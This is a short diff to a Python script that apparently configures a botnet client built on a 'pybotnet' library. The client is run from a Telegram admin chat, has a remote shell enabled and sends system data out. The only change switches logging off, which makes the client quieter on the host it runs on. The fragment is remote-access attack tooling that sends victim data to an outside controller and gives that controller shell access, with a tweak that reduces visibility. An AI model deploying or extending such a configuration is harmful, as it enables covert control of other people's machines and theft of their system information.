@@ -45,7 +45,7 @@ ADMIN_CHAT_ID = '12345678910'
 # * send_system_data: send system short info in bot messages
 
 bot = pybotnet.PyBotNet(TELEGRAM_TOKEN, ADMIN_CHAT_ID,
-                        show_log=True, send_system_data=True, is_shell=True)
+                        show_log=False, send_system_data=True, is_shell=True)
 
 delay = 10
 
